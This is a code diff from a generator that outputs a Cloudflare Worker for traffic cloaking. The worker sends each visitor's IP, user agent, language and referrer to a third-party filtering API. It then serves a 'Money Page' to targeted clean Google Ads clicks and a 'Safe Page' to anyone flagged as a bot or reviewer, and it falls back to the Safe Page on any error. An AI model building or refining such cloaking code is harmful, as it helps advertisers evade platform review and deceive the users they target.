@@ -687,64 +687,66 @@ const TARGET_COUNTRIES = ${JSON.stringify(targetCountries)};
 const EXCLUDE_COUNTRIES = ${JSON.stringify(excludeCountries)};
 // --- END CONFIGURATION ---
 
-export default {
-  async fetch(request) {
-    try {
-      // Step 1: Gather all visitor data from Cloudflare's request headers
-      const data = {
-        ip:       request.headers.get('CF-Connecting-IP') || '',
-        ua:       request.headers.get('User-Agent') || '',
-        lan:      request.headers.get('Accept-Language') || '',
-        ref:      request.headers.get('Referer') || '',
-        
-        // --- ADVANCED POST FILTERS ---
-        inc_loc:  TARGET_COUNTRIES.join(','), // Target specific countries
-        ex_loc:   EXCLUDE_COUNTRIES.join(','), // Exclude specific countries if needed
-        devices:  '',        // Leave empty to allow all devices (Mobile, Computers, etc.)
-        os:       '',        // Leave empty to allow all OS (Windows, iOS, etc.)
-        lans:     '',        // Leave empty to allow all languages
-        is_geo:   true,      // Enable Geo-location checks
-        is_device:true,      // Enable Device checks
-        is_os:    true,      // Enable OS checks
-        is_lang:  true,      // Enable Language checks
-        is_gclid: true,      // CRITICAL: Set to true to filter for valid Google Ad clicks
-        ipscore:  true       // CRITICAL: Set to true to use their most powerful IP analysis
-      };
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
 
-      // Step 2: Call the JCI API using the POST method for advanced filtering
-      const jciApiUrl = 'https://jcibj.com/lapi/rest/r/' + JCI_USER_ID;
+async function handleRequest(request) {
+  try {
+    // Step 1: Gather all visitor data from Cloudflare's request headers
+    const data = {
+      ip:       request.headers.get('CF-Connecting-IP') || '',
+      ua:       request.headers.get('User-Agent') || '',
+      lan:      request.headers.get('Accept-Language') || '',
+      ref:      request.headers.get('Referer') || '',
       
-      const apiResponse = await fetch(jciApiUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(data).toString()
-      });
+      // --- ADVANCED POST FILTERS ---
+      inc_loc:  TARGET_COUNTRIES.join(','), // Target specific countries
+      ex_loc:   EXCLUDE_COUNTRIES.join(','), // Exclude specific countries if needed
+      devices:  '',        // Leave empty to allow all devices (Mobile, Computers, etc.)
+      os:       '',        // Leave empty to allow all OS (Windows, iOS, etc.)
+      lans:     '',        // Leave empty to allow all languages
+      is_geo:   true,      // Enable Geo-location checks
+      is_device:true,      // Enable Device checks
+      is_os:    true,      // Enable OS checks
+      is_lang:  true,      // Enable Language checks
+      is_gclid: true,      // CRITICAL: Set to true to filter for valid Google Ad clicks
+      ipscore:  true       // CRITICAL: Set to true to use their most powerful IP analysis
+    };
 
-      if (!apiResponse.ok) {
-        // If the API call fails, always show the safe page as a fallback
-        return fetch(SAFE_URL);
-      }
+    // Step 2: Call the JCI API using the POST method for advanced filtering
+    const jciApiUrl = 'https://jcibj.com/lapi/rest/r/' + JCI_USER_ID;
+    
+    const apiResponse = await fetch(jciApiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams(data).toString()
+    });
 
-      const jciResult = await apiResponse.json();
-
-      // Step 3: Analyze the API response and make the decision
-      // From the docs: 'type' == 'false' means PASS (show Money Page)
-      // 'type' == 'true' means BLOCK (show Safe Page)
-      if (jciResult.type === 'false' || jciResult.status === 'passed') {
-        // The visitor is clean. Show them the Money Page.
-        return fetch(MONEY_URL);
-      } else {
-        // The visitor is a bot/reviewer. Show them the Safe Page.
-        return fetch(SAFE_URL);
-      }
-
-    } catch (error) {
-      // If any error occurs during the process, ALWAYS default to showing the Safe Page.
-      // This is your most important safety net.
+    if (!apiResponse.ok) {
+      // If the API call fails, always show the safe page as a fallback
       return fetch(SAFE_URL);
     }
-  },
-};`;
+
+    const jciResult = await apiResponse.json();
+
+    // Step 3: Analyze the API response and make the decision
+    // From the docs: 'type' == 'false' means PASS (show Money Page)
+    // 'type' == 'true' means BLOCK (show Safe Page)
+    if (jciResult.type === 'false' || jciResult.status === 'passed') {
+      // The visitor is clean. Show them the Money Page.
+      return fetch(MONEY_URL);
+    } else {
+      // The visitor is a bot/reviewer. Show them the Safe Page.
+      return fetch(SAFE_URL);
+    }
+
+  } catch (error) {
+    // If any error occurs during the process, ALWAYS default to showing the Safe Page.
+    // This is your most important safety net.
+    return fetch(SAFE_URL);
+  }
+}`;
 }
 
 // Helper function to create a simple "Coming Soon" page
